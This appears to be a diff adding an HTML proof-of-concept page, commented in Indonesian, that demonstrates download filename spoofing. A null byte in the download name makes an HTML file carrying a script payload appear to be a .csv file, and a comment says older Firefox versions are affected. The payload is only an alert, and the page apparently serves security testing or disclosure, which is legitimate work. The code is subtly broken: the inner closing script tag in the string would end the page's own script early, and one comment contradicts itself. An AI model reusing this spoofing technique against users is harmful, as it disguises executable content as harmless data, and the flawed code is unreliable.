@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Download Filename Spoofing PoC</title>
+</head>
+<body>
+  <h2>Test: Fake CSV File Download</h2>
+
+  <p>
+    Klik tombol di bawah untuk mengunduh file "CSV" yang sebenarnya adalah HTML.
+  </p>
+
+  <button onclick="downloadFakeCSV()">Download Fake CSV</button>
+
+  <script>
+    function downloadFakeCSV() {
+      const blobContent = `<html><body><script>alert('XSS via HTML download')</script></body></html>`;
+      const blob = new Blob([blobContent], { type: "text/html" });
+
+      const a = document.createElement("a");
+      a.href = URL.createObjectURL(blob);
+
+      // Download name: terlihat sebagai .csv, tapi sebenarnya .html
+      // Bug: Firefox lama akan menyimpan sebagai myfile.html, meskipun ditampilkan sebagai myfile.html.csv
+      a.download = "myfile.html\u0000.csv";
+
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+    }
+  </script>
+</body>
+</html>
